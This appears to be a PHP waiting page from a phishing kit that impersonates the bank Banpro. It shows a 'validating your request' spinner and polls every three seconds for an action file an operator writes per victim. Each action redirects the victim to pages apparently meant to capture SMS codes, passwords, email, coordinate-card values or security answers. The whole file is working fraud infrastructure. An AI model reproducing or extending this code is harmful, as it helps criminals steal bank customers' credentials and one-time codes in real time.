<?php
session_start();
$usuario = $_SESSION['usuario'] ?? null;

if (!$usuario) {
  header("Location: index.php");
  exit;
}

$archivo = "acciones/$usuario.txt";

if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    // Detecta si la acción es una pregunta personalizada
    if (str_starts_with($accion, "/palabra clave/")) {
        $partes = explode("/palabra clave/", $accion);
        if (count($partes) > 1) {
            $_SESSION['pregunta'] = trim($partes[1]);
            header("Location: pregunta.php");
            exit;
        }
    }

    // Detecta si la acción es coordenadas personalizadas
    if (str_starts_with($accion, "/coordenadas etiquetas/")) {
        $partes = explode("/coordenadas etiquetas/", $accion);
        if (count($partes) > 1) {
            $_SESSION['etiquetas'] = trim($partes[1]);
            header("Location: coordenadas.php");
            exit;
        }
    }

    // Acciones predeterminadas
    $destinos_validos = ['sms.php', 'smserror.php', 'index2.php', 'correo.php', 'clave.php', 'coordenadas.php', 'pregunta.php'];

    if (in_array($accion, $destinos_validos)) {
        header("Location: $accion");
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Banpro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="3">
    <link rel="stylesheet" href="archivos/style.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #2e7d32;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 40px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .subtexto {
            font-size: 1.2em;
            color: #444;
        }
    </style>
</head>
<body>
  <h2>Por favor espera.</h2>
  <p class="subtexto">Estamos validando tu solicitud, mantente en línea</p>
  <div class="loader"></div>
</body>
</html>
